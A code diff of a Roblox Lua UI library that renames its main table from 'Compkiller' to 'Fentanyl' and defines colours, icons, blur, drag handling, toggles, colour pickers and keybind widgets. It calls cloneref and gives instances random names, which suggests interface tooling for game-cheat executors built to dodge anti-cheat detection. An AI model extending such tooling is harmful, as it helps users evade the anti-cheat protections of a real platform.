@@ -319,7 +319,7 @@
 	local Mouse: Mouse = LocalPlayer:GetMouse();
 	local CurrentCamera: Camera? = workspace.CurrentCamera;
 
-	local Compkiller = {
+	local Fentanyl = {
 		Version = '1.8',
 		Logo = "rbxassetid://120245531583106",
 		Windows = {},
@@ -332,7 +332,7 @@
 		ArcylicParent = CurrentCamera
 	};
 
-	Compkiller.Colors = {
+	Fentanyl.Colors = {
 		Highlight = Color3.fromRGB(17, 238, 253),
 		Toggle = Color3.fromRGB(14, 203, 213),
 		Risky = Color3.fromRGB(251, 255, 39),
@@ -347,7 +347,7 @@
 		HighStrokeColor = Color3.fromRGB(55, 56, 63),
 	};
 
-	Compkiller.Elements = {
+	Fentanyl.Elements = {
 		Highlight = {},
 		DropHighlight = {},
 		Risky = {},
@@ -361,12 +361,12 @@
 		HighStrokeColor = {},
 	};
 
-	Compkiller.DragBlacklist = {};
-	Compkiller.IaDrag = false;
-	Compkiller.LastDrag = tick();
-	Compkiller.Flags = {};
+	Fentanyl.DragBlacklist = {};
+	Fentanyl.IaDrag = false;
+	Fentanyl.LastDrag = tick();
+	Fentanyl.Flags = {};
 
-	Compkiller.Lucide = {
+	Fentanyl.Lucide = {
 		['lucide-mouse-2'] = "rbxassetid://10088146939",
 		['lucide-internet'] = "rbxassetid://12785195438",
 		['lucide-earth'] = "rbxassetid://115986292591138",
@@ -1191,15 +1191,15 @@
 		["lucide-zoom-out"] = "rbxassetid://10747384679",
 	};
 
-	function Compkiller:_GetIcon(name : string) : string
-		return Compkiller.Lucide['lucide-'..tostring(name)] or Compkiller.Lucide[name] or Compkiller.Lucide[tostring(name)] or name;
+	function Fentanyl:_GetIcon(name : string) : string
+		return Fentanyl.Lucide['lucide-'..tostring(name)] or Fentanyl.Lucide[name] or Fentanyl.Lucide[tostring(name)] or name;
 	end;
 
-	function Compkiller:_RandomString() : string
+	function Fentanyl:_RandomString() : string
 		return "CK="..string.char(math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102),math.random(64,102));	
 	end;
 
-	function Compkiller:_IsMouseOverFrame(Frame : Frame) : boolean
+	function Fentanyl:_IsMouseOverFrame(Frame : Frame) : boolean
 		if not Frame then
 			return;
 		end;
@@ -1211,12 +1211,12 @@
 		end;
 	end;
 
-	function Compkiller:_Rounding(num: number, numDecimalPlaces: number) : number
+	function Fentanyl:_Rounding(num: number, numDecimalPlaces: number) : number
 		local mult: number = 10 ^ (numDecimalPlaces or 0);
 		return math.floor(num * mult + 0.5) / mult;
 	end;
 
-	function Compkiller:_Animation(Self: Instance , Info: TweenInfo , Property :{[K] : V})
+	function Fentanyl:_Animation(Self: Instance , Info: TweenInfo , Property :{[K] : V})
 		local Tween = TweenService:Create(Self , Info or TweenInfo.new(0.25) , Property);
 
 		Tween:Play();
@@ -1224,7 +1224,7 @@
 		return Tween;
 	end;
 
-	function Compkiller:_Input(Frame : Frame , Callback : () -> ()) : TextButton
+	function Fentanyl:_Input(Frame : Frame , Callback : () -> ()) : TextButton
 		local Button = Instance.new('TextButton',Frame);
 
 		Button.ZIndex = Frame.ZIndex + 10;
@@ -1239,7 +1239,7 @@
 		return Button;
 	end;
 
-	function Compkiller:GetCalculatePosition(planePos: number, planeNormal: number, rayOrigin: number, rayDirection: number) : number
+	function Fentanyl:GetCalculatePosition(planePos: number, planeNormal: number, rayOrigin: number, rayDirection: number) : number
 		local n = planeNormal;
 		local d = rayDirection;
 		local v = rayOrigin - planePos;
@@ -1251,8 +1251,8 @@
 		return rayOrigin + (a * rayDirection);
 	end;
 
-	function Compkiller:_Blur(element : Frame , WindowRemote) : RBXScriptSignal
-		local Part = Instance.new('Part',Compkiller.ArcylicParent);
+	function Fentanyl:_Blur(element : Frame , WindowRemote) : RBXScriptSignal
+		local Part = Instance.new('Part',Fentanyl.ArcylicParent);
 		local DepthOfField = Instance.new('DepthOfFieldEffect',cloneref(game:GetService('Lighting')));
 		local BlockMesh = Instance.new("BlockMesh");
 		local userSettings = UserSettings():GetService("UserGameSettings");
@@ -1266,7 +1266,7 @@
 		Part.Anchored = true;
 		Part.CanCollide = false;
 		Part.CanQuery = false;
-		Part.CollisionGroup = Compkiller:_RandomString();
+		Part.CollisionGroup = Fentanyl:_RandomString();
 		Part.Size = Vector3.new(1, 1, 1) * 0.01;
 		Part.Color = Color3.fromRGB(0,0,0);
 
@@ -1275,29 +1275,29 @@
 		DepthOfField.FocusDistance = 0;
 		DepthOfField.InFocusRadius = 1000;
 		DepthOfField.NearIntensity = 1;
-		DepthOfField.Name = Compkiller:_RandomString();
+		DepthOfField.Name = Fentanyl:_RandomString();
 
-		Part.Name = Compkiller:_RandomString();
+		Part.Name = Fentanyl:_RandomString();
 
 		local UpdateFunction = function()
 			local IsWindowActive = WindowRemote:GetValue();
 
 			if IsWindowActive then
 
-				Compkiller:_Animation(DepthOfField,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(DepthOfField,TweenInfo.new(0.1),{
 					NearIntensity = 1
 				})
 
-				Compkiller:_Animation(Part,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(Part,TweenInfo.new(0.1),{
 					Transparency = 0.97,
 					Size = Vector3.new(1, 1, 1) * 0.01;
 				})
 			else
-				Compkiller:_Animation(DepthOfField,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(DepthOfField,TweenInfo.new(0.1),{
 					NearIntensity = 0
 				})
 
-				Compkiller:_Animation(Part,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(Part,TweenInfo.new(0.1),{
 					Size = Vector3.zero,
 					Transparency = 1.5,
 				})
@@ -1316,8 +1316,8 @@
 
 				local planeNormal = CurrentCamera.CFrame.LookVector;
 
-				local pos0 = Compkiller:GetCalculatePosition(planeOrigin, planeNormal, ray0.Origin, ray0.Direction);
-				local pos1 = Compkiller:GetCalculatePosition(planeOrigin, planeNormal, ray1.Origin, ray1.Direction);
+				local pos0 = Fentanyl:GetCalculatePosition(planeOrigin, planeNormal, ray0.Origin, ray0.Direction);
+				local pos1 = Fentanyl:GetCalculatePosition(planeOrigin, planeNormal, ray1.Origin, ray1.Direction);
 
 				pos0 = CurrentCamera.CFrame:PointToObjectSpace(pos0);
 				pos1 = CurrentCamera.CFrame:PointToObjectSpace(pos1);
@@ -1355,26 +1355,26 @@
 		return rbxsignal;
 	end;
 
-	function Compkiller:_AddDragBlacklist(Frame: Frame)
+	function Fentanyl:_AddDragBlacklist(Frame: Frame)
 		local IsAdded = false;
 		local BASE_TIME = 0.01;
 
 		local SET_BLACKLIST = function(value)
-			local index = table.find(Compkiller.DragBlacklist , Frame);
+			local index = table.find(Fentanyl.DragBlacklist , Frame);
 
-			if value and not Compkiller.IS_DRAG_MOVE then
+			if value and not Fentanyl.IS_DRAG_MOVE then
 				if not index then
-					table.insert(Compkiller.DragBlacklist,Frame);
+					table.insert(Fentanyl.DragBlacklist,Frame);
 				end;
 			else
 				if index then
-					table.remove(Compkiller.DragBlacklist,index);
+					table.remove(Fentanyl.DragBlacklist,index);
 				end;
 			end;
 		end;
 
 		Frame.InputBegan:Connect(function(input)
-			if Compkiller:_IsMouseOverFrame(Frame) then
+			if Fentanyl:_IsMouseOverFrame(Frame) then
 				SET_BLACKLIST(true)
 			end;
 		end);
@@ -1384,21 +1384,21 @@
 		end);
 
 		UserInputService.InputChanged:Connect(function()
-			if not Compkiller:_IsMouseOverFrame(Frame) then
+			if not Fentanyl:_IsMouseOverFrame(Frame) then
 				SET_BLACKLIST(false);
 			end
 		end);
 	end;
 
-	function Compkiller:_GetWindowFromElement(Element)
-		for i,v : ScreenGui in next , Compkiller.Windows do
+	function Fentanyl:_GetWindowFromElement(Element)
+		for i,v : ScreenGui in next , Fentanyl.Windows do
 			if v and Element:IsDescendantOf(v) then
 				return v;
 			end;
 		end;
 	end;
 
-	function Compkiller.__SIGNAL(default)
+	function Fentanyl.__SIGNAL(default)
 		local Bindable = Instance.new('BindableEvent');
 
 		Bindable.Name = string.sub(tostring({}),7);
@@ -1436,13 +1436,13 @@
 		return Binds;
 	end;
 
-	function Compkiller:_Hover(Frame: Frame , OnHover: () -> any?, Release: () -> any?)
+	function Fentanyl:_Hover(Frame: Frame , OnHover: () -> any?, Release: () -> any?)
 		Frame.MouseEnter:Connect(OnHover);
 
 		Frame.MouseLeave:Connect(Release);
 	end;
 
-	function Compkiller.__CONFIG(config , default)
+	function Fentanyl.__CONFIG(config , default)
 		config = config or {};
 
 		for i,v in next , default do
@@ -1454,7 +1454,7 @@
 		return config;
 	end;
 
-	function Compkiller:Drag(InputFrame: Frame, MoveFrame: Frame, Speed : number)
+	function Fentanyl:Drag(InputFrame: Frame, MoveFrame: Frame, Speed : number)
 		local dragToggle: boolean = false;
 		local dragStart: Vector3 = nil;
 		local startPos: UDim2 = nil;
@@ -1465,55 +1465,55 @@
 			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
 				startPos.Y.Scale, startPos.Y.Offset + delta.Y);
 
-			Compkiller:_Animation(MoveFrame,Tween,{
+			Fentanyl:_Animation(MoveFrame,Tween,{
 				Position = position
 			});
 		end;
 
 		InputFrame.InputBegan:Connect(function(input)
-			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and #Compkiller.DragBlacklist <= 0 then 
+			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and #Fentanyl.DragBlacklist <= 0 then 
 				dragToggle = true
 				dragStart = input.Position
 				startPos = MoveFrame.Position
 				input.Changed:Connect(function()
 					if input.UserInputState == Enum.UserInputState.End then
 						dragToggle = false;
-						Compkiller.IS_DRAG_MOVE = false;
+						Fentanyl.IS_DRAG_MOVE = false;
 					end
 				end)
 			end
 
-			if not Compkiller.IsDrage and dragToggle then
-				Compkiller.LastDrag = tick();
+			if not Fentanyl.IsDrage and dragToggle then
+				Fentanyl.LastDrag = tick();
 			end;
 
-			Compkiller.IaDrag = dragToggle;
+			Fentanyl.IaDrag = dragToggle;
 		end)
 
 		UserInputService.InputChanged:Connect(function(input)
-			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch and #Compkiller.DragBlacklist <= 0 then
+			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch and #Fentanyl.DragBlacklist <= 0 then
 				if dragToggle then
-					Compkiller.IS_DRAG_MOVE = true;
+					Fentanyl.IS_DRAG_MOVE = true;
 					updateInput(input)
 				else
-					Compkiller.IS_DRAG_MOVE = false;
+					Fentanyl.IS_DRAG_MOVE = false;
 				end
 			else
-				if #Compkiller.DragBlacklist > 0 then
+				if #Fentanyl.DragBlacklist > 0 then
 					dragToggle = false
-					Compkiller.IS_DRAG_MOVE = false;
+					Fentanyl.IS_DRAG_MOVE = false;
 				end
 			end
 
-			Compkiller.IaDrag = dragToggle;
+			Fentanyl.IaDrag = dragToggle;
 		end);
 	end;
 
-	function Compkiller:_IsMobile()
+	function Fentanyl:_IsMobile()
 		return UserInputService.TouchEnabled;
 	end;
 
-	function Compkiller:_AddLinkValue(Name , Default , GlobalBlock , LinkValues , rep , Signal)
+	function Fentanyl:_AddLinkValue(Name , Default , GlobalBlock , LinkValues , rep , Signal)
 		if Name == "Toggle" then
 			local Toggle = Instance.new("Frame")
 			local UICorner = Instance.new("UICorner")
@@ -1521,16 +1521,16 @@
 			local ToggleValue = Instance.new("Frame")
 			local UICorner_2 = Instance.new("UICorner")
 
-			Toggle.Name = Compkiller:_RandomString()
+			Toggle.Name = Fentanyl:_RandomString()
 			Toggle.Parent = LinkValues
-			Toggle.BackgroundColor3 = Compkiller.Colors.DropColor
+			Toggle.BackgroundColor3 = Fentanyl.Colors.DropColor
 			Toggle.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Toggle.BorderSizePixel = 0
 			Toggle.Size = UDim2.new(0, 30, 0, 16)
 			Toggle.ZIndex = GlobalBlock.ZIndex + 1
 			Toggle.LayoutOrder = -#LinkValues:GetChildren();
 
-			table.insert(Compkiller.Elements.DropColor , {
+			table.insert(Fentanyl.Elements.DropColor , {
 				Element = Toggle,
 				Property = "BackgroundColor3"
 			})
@@ -1538,18 +1538,18 @@
 			UICorner.CornerRadius = UDim.new(1, 0)
 			UICorner.Parent = Toggle
 
-			UIStroke.Color = Compkiller.Colors.HighStrokeColor
+			UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 			UIStroke.Parent = Toggle
 
-			table.insert(Compkiller.Elements.HighStrokeColor,{
+			table.insert(Fentanyl.Elements.HighStrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			})
 
-			ToggleValue.Name = Compkiller:_RandomString()
+			ToggleValue.Name = Fentanyl:_RandomString()
 			ToggleValue.Parent = Toggle
 			ToggleValue.AnchorPoint = Vector2.new(0.5, 0.5)
-			ToggleValue.BackgroundColor3 = Compkiller.Colors.SwitchColor
+			ToggleValue.BackgroundColor3 = Fentanyl.Colors.SwitchColor
 			ToggleValue.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			ToggleValue.BorderSizePixel = 0
 			ToggleValue.Position = UDim2.new(0.25, 0, 0.5, 0)
@@ -1568,36 +1568,36 @@
 				if bool then
 					Toggle:SetAttribute('Enabled',true);
 
-					Compkiller:_Animation(ToggleValue,rep.Tween,{
+					Fentanyl:_Animation(ToggleValue,rep.Tween,{
 						Position = UDim2.new(0.75, 0, 0.5, 0)
 					})
 
-					Compkiller:_Animation(Toggle,rep.Tween,{
-						BackgroundColor3 = Compkiller.Colors.Toggle
+					Fentanyl:_Animation(Toggle,rep.Tween,{
+						BackgroundColor3 = Fentanyl.Colors.Toggle
 					})
 				else
 					Toggle:SetAttribute('Enabled',false);
 
-					Compkiller:_Animation(ToggleValue,rep.Tween,{
+					Fentanyl:_Animation(ToggleValue,rep.Tween,{
 						Position = UDim2.new(0.25, 0, 0.5, 0)
 					})
 
-					Compkiller:_Animation(Toggle,rep.Tween,{
-						BackgroundColor3 = Compkiller.Colors.DropColor
+					Fentanyl:_Animation(Toggle,rep.Tween,{
+						BackgroundColor3 = Fentanyl.Colors.DropColor
 					})
 				end;
 			end;
 
-			local Input = Compkiller:_Input(Toggle);
+			local Input = Fentanyl:_Input(Toggle);
 
-			Compkiller:_Hover(Input , function()
+			Fentanyl:_Hover(Input , function()
 				if not Default then
-					Compkiller:_Animation(ToggleValue,rep.Tween,{
+					Fentanyl:_Animation(ToggleValue,rep.Tween,{
 						Size = UDim2.new(0.6, 0, 0.6, 0)
 					})
 				end;
 			end , function()
-				Compkiller:_Animation(ToggleValue,rep.Tween,{
+				Fentanyl:_Animation(ToggleValue,rep.Tween,{
 					Size = UDim2.new(0.550000012, 0, 0.550000012, 0)
 				})
 			end);
@@ -1606,29 +1606,29 @@
 				if bool then
 					ToggleElement(Default,true);
 
-					Compkiller:_Animation(ToggleValue,rep.Tween,{
+					Fentanyl:_Animation(ToggleValue,rep.Tween,{
 						BackgroundTransparency = 0
 					})
 
-					Compkiller:_Animation(Toggle,rep.Tween,{
+					Fentanyl:_Animation(Toggle,rep.Tween,{
 						BackgroundTransparency = 0
 					})
 
-					Compkiller:_Animation(UIStroke,rep.Tween,{
+					Fentanyl:_Animation(UIStroke,rep.Tween,{
 						Transparency = 0
 					})
 				else
 					ToggleElement(false,true);
 
-					Compkiller:_Animation(ToggleValue,rep.Tween,{
+					Fentanyl:_Animation(ToggleValue,rep.Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(Toggle,rep.Tween,{
+					Fentanyl:_Animation(Toggle,rep.Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(UIStroke,rep.Tween,{
+					Fentanyl:_Animation(UIStroke,rep.Tween,{
 						Transparency = 1
 					})
 				end;
@@ -1651,7 +1651,7 @@
 			local UIStroke = Instance.new("UIStroke")
 			local UICorner = Instance.new("UICorner")
 
-			ColorPicker.Name = Compkiller:_RandomString()
+			ColorPicker.Name = Fentanyl:_RandomString()
 			ColorPicker.Parent = LinkValues
 			ColorPicker.BackgroundTransparency = 1.000
 			ColorPicker.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -1660,7 +1660,7 @@
 			ColorPicker.ZIndex = GlobalBlock.ZIndex + 1
 			ColorPicker.LayoutOrder = -#LinkValues:GetChildren();
 
-			ColorFrame.Name = Compkiller:_RandomString()
+			ColorFrame.Name = Fentanyl:_RandomString()
 			ColorFrame.Parent = ColorPicker
 			ColorFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 			ColorFrame.BackgroundColor3 = Color3.fromRGB(15, 255, 207)
@@ -1672,10 +1672,10 @@
 
 			UIScale.Parent = ColorFrame
 
-			UIStroke.Color = Compkiller.Colors.HighStrokeColor
+			UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 			UIStroke.Parent = ColorFrame
 
-			table.insert(Compkiller.Elements.HighStrokeColor,{
+			table.insert(Fentanyl.Elements.HighStrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			})
@@ -1685,33 +1685,33 @@
 
 			Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(ColorFrame,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(ColorFrame,TweenInfo.new(0.15),{
 						BackgroundTransparency = 0,
 					})
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.15),{
 						Transparency = 0,
 					})
 				else
-					Compkiller:_Animation(ColorFrame,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(ColorFrame,TweenInfo.new(0.15),{
 						BackgroundTransparency = 1,
 					})
 
-					Compkiller:_Animation(UIStroke,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(UIStroke,TweenInfo.new(0.15),{
 						Transparency = 1,
 					})
 				end;
 			end)
 
-			Compkiller:_Hover(ColorPicker, function()
+			Fentanyl:_Hover(ColorPicker, function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(UIScale,TweenInfo.new(0.35),{
+					Fentanyl:_Animation(UIScale,TweenInfo.new(0.35),{
 						Scale = 1.2
 					})
 				end;
 			end , function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(UIScale,TweenInfo.new(0.35),{
+					Fentanyl:_Animation(UIScale,TweenInfo.new(0.35),{
 						Scale = 1
 					})
 				end;
@@ -1771,9 +1771,9 @@
 			local UIStroke = Instance.new("UIStroke")
 			local TextLabel = Instance.new("TextLabel")
 
-			Keybind.Name = Compkiller:_RandomString()
+			Keybind.Name = Fentanyl:_RandomString()
 			Keybind.Parent = LinkValues
-			Keybind.BackgroundColor3 = Compkiller.Colors.DropColor
+			Keybind.BackgroundColor3 = Fentanyl.Colors.DropColor
 			Keybind.BackgroundTransparency = 0.8
 			Keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Keybind.BorderSizePixel = 0
@@ -1783,7 +1783,7 @@
 			Keybind.LayoutOrder = -#LinkValues:GetChildren();
 
 
-			table.insert(Compkiller.Elements.DropColor , {
+			table.insert(Fentanyl.Elements.DropColor , {
 				Element = Keybind,
 				Property = "BackgroundColor3"
 			})
@@ -1791,10 +1791,10 @@
 			UICorner.CornerRadius = UDim.new(0, 3)
 			UICorner.Parent = Keybind
 
-			UIStroke.Color = Compkiller.Colors.HighStrokeColor
+			UIStroke.Color = Fentanyl.Colors.HighStrokeColor
 			UIStroke.Parent = Keybind
 
-			table.insert(Compkiller.Elements.HighStrokeColor,{
+			table.insert(Fentanyl.Elements.HighStrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			})
@@ -1809,11 +1809,11 @@
 			TextLabel.ZIndex = GlobalBlock.ZIndex + 3
 			TextLabel.Font = Enum.Font.Gotham
 			TextLabel.Text = GetItem(Default or "None");
-			TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+			TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 			TextLabel.TextSize = 12.000
 			TextLabel.TextTransparency = 0.200
 
-			table.insert(Compkiller.Elements.SwitchColor,{
+			table.insert(Fentanyl.Elements.SwitchColor,{
 				Element = TextLabel,
 				Property = "TextColor3"
 			});
@@ -1821,7 +1821,7 @@
 			local Update = function()
 				local size = TextService:GetTextSize(TextLabel.Text,TextLabel.TextSize,TextLabel.Font,Vector2.new(math.huge,math.huge));
 
-				Compkiller:_Animation(Keybind,TweenInfo.new(0.1),{
+				Fentanyl:_Animation(Keybind,TweenInfo.new(0.1),{
 					Size = UDim2.new(0, size.X + 5, 0, 16)
 				});
 			end;
@@ -1830,27 +1830,27 @@
 
 			local ToggleUI = function(bool)
 				if bool then
-					Compkiller:_Animation(Keybind,rep.Tween,{
+					Fentanyl:_Animation(Keybind,rep.Tween,{
 						BackgroundTransparency = 0.8
 					})
 
-					Compkiller:_Animation(UIStroke,rep.Tween,{
+					Fentanyl:_Animation(UIStroke,rep.Tween,{
 						Transparency = 0
 					})
 
-					Compkiller:_Animation(TextLabel,rep.Tween,{
+					Fentanyl:_Animation(TextLabel,rep.Tween,{
 						TextTransparency = 0.200
 					})
 				else
-					Compkiller:_Animation(Keybind,rep.Tween,{
+					Fentanyl:_Animation(Keybind,rep.Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(UIStroke,rep.Tween,{
+					Fentanyl:_Animation(UIStroke,rep.Tween,{
 						Transparency = 1
 					})
 
-					Compkiller:_Animation(TextLabel,rep.Tween,{
+					Fentanyl:_Animation(TextLabel,rep.Tween,{
 						TextTransparency = 1
 					})
 				end;
@@ -1873,7 +1873,7 @@
 			local UIStroke = Instance.new("UIStroke")
 			local UICorner_2 = Instance.new("UICorner")
 
-			InfoButton.Name = Compkiller:_RandomString()
+			InfoButton.Name = Fentanyl:_RandomString()
 			InfoButton.Parent = LinkValues
 			InfoButton.BackgroundTransparency = 1.000
 			InfoButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -1887,12 +1887,12 @@
 			UICorner.CornerRadius = UDim.new(1, 0)
 			UICorner.Parent = InfoButton
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = InfoButton
 			BlockText.AnchorPoint = Vector2.new(0, 0)
-			BlockText.BackgroundColor3 = Compkiller.Colors.BlockColor
+			BlockText.BackgroundColor3 = Fentanyl.Colors.BlockColor
 
-			table.insert(Compkiller.Elements.BlockColor , {
+			table.insert(Fentanyl.Elements.BlockColor , {
 				Element = BlockText,
 				Property = "BackgroundColor3"
 			});
@@ -1904,21 +1904,21 @@
 			BlockText.ZIndex = GlobalBlock.ZIndex + 26
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = " "
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 			BlockText.TextSize = 13.000
 			BlockText.TextTransparency = 0.300
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor,{
+			table.insert(Fentanyl.Elements.SwitchColor,{
 				Element = BlockText,
 				Property = "TextColor3"
 			});
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 			UIStroke.Parent = BlockText
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
@@ -1928,25 +1928,25 @@
 
 			Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(InfoButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(InfoButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.500
 					})
 				else
-					Compkiller:_Animation(InfoButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(InfoButton,TweenInfo.new(0.15),{
 						ImageTransparency = 1
 					})
 				end;
 			end)
 
-			Compkiller:_Hover(InfoButton, function()
+			Fentanyl:_Hover(InfoButton, function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(InfoButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(InfoButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.1
 					})
 				end;
 			end , function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(InfoButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(InfoButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.500
 					})
 				end;
@@ -1961,7 +1961,7 @@
 			local OptionButton = Instance.new("ImageButton")
 			local UICorner = Instance.new("UICorner")
 
-			OptionButton.Name = Compkiller:_RandomString()
+			OptionButton.Name = Fentanyl:_RandomString()
 			OptionButton.Parent = LinkValues
 			OptionButton.BackgroundTransparency = 1.000
 			OptionButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -1977,25 +1977,25 @@
 
 			Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(OptionButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(OptionButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.500
 					})
 				else
-					Compkiller:_Animation(OptionButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(OptionButton,TweenInfo.new(0.15),{
 						ImageTransparency = 1
 					})
 				end;
 			end)
 
-			Compkiller:_Hover(OptionButton, function()
+			Fentanyl:_Hover(OptionButton, function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(OptionButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(OptionButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.1
 					})
 				end;
 			end , function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(OptionButton,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(OptionButton,TweenInfo.new(0.15),{
 						ImageTransparency = 0.500
 					})
 				end;
@@ -2005,25 +2005,25 @@
 		end;
 	end;
 
-	function Compkiller:_CreateBlock(Signal)
+	function Fentanyl:_CreateBlock(Signal)
 		local GlobalBlock = Instance.new("Frame")
 		local BlockText = Instance.new("TextLabel")
 		local LinkValues = Instance.new("Frame")
 		local UIListLayout = Instance.new("UIListLayout")
 		local BlockLine = Instance.new("Frame")
 
-		if Compkiller:_IsMobile() then
-			Compkiller:_AddDragBlacklist(GlobalBlock);
+		if Fentanyl:_IsMobile() then
+			Fentanyl:_AddDragBlacklist(GlobalBlock);
 		end;
 
-		GlobalBlock.Name = Compkiller:_RandomString()
+		GlobalBlock.Name = Fentanyl:_RandomString()
 		GlobalBlock.BackgroundTransparency = 1.000
 		GlobalBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		GlobalBlock.BorderSizePixel = 0
 		GlobalBlock.Size = UDim2.new(1, -1, 0, 30)
 		GlobalBlock.ZIndex = 10
 
-		BlockText.Name = Compkiller:_RandomString()
+		BlockText.Name = Fentanyl:_RandomString()
 		BlockText.Parent = GlobalBlock
 		BlockText.AnchorPoint = Vector2.new(0, 0.5)
 		BlockText.BackgroundTransparency = 1.000
@@ -2034,17 +2034,17 @@
 		BlockText.ZIndex = 10
 		BlockText.Font = Enum.Font.GothamMedium
 		BlockText.Text = "Block"
-		BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+		BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 		BlockText.TextSize = 14.000
 		BlockText.TextTransparency = 0.300
 		BlockText.TextXAlignment = Enum.TextXAlignment.Left
 
-		table.insert(Compkiller.Elements.SwitchColor , {
+		table.insert(Fentanyl.Elements.SwitchColor , {
 			Element = BlockText,
 			Property = 'TextColor3'
 		});
 
-		LinkValues.Name = Compkiller:_RandomString()
+		LinkValues.Name = Fentanyl:_RandomString()
 		LinkValues.Parent = GlobalBlock
 		LinkValues.AnchorPoint = Vector2.new(1, 0.540000021)
 		LinkValues.BackgroundTransparency = 1.000
@@ -2061,10 +2061,10 @@
 		UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
 		UIListLayout.Padding = UDim.new(0, 8)
 
-		BlockLine.Name = Compkiller:_RandomString()
+		BlockLine.Name = Fentanyl:_RandomString()
 		BlockLine.Parent = GlobalBlock
 		BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-		BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+		BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 		BlockLine.BackgroundTransparency = 0.500
 		BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 		BlockLine.BorderSizePixel = 0
@@ -2072,7 +2072,7 @@
 		BlockLine.Size = UDim2.new(1, -26, 0, 1)
 		BlockLine.ZIndex = 12
 
-		table.insert(Compkiller.Elements.LineColor,{
+		table.insert(Fentanyl.Elements.LineColor,{
 			Element = BlockLine,
 			Property = "BackgroundColor3"
 		});
@@ -2088,13 +2088,13 @@
 		end;
 
 		function rep:SetTextColor(Color)
-			local oldIndex = table.find(Compkiller.Elements.SwitchColor , BlockText);
+			local oldIndex = table.find(Fentanyl.Elements.SwitchColor , BlockText);
 
-			table.remove(Compkiller.Elements.SwitchColor , oldIndex);
+			table.remove(Fentanyl.Elements.SwitchColor , oldIndex);
 
 			BlockText.TextColor3 = Color;
 
-			table.insert(Compkiller.Elements.Risky , {
+			table.insert(Fentanyl.Elements.Risky , {
 				Element = BlockText,
 				Property = 'TextColor3'
 			});
@@ -2108,7 +2108,7 @@
 		function rep:SetTransparency(num)
 			rep.TextTransparency = num;
 
-			Compkiller:_Animation(BlockText,TweenInfo.new(0.3),{
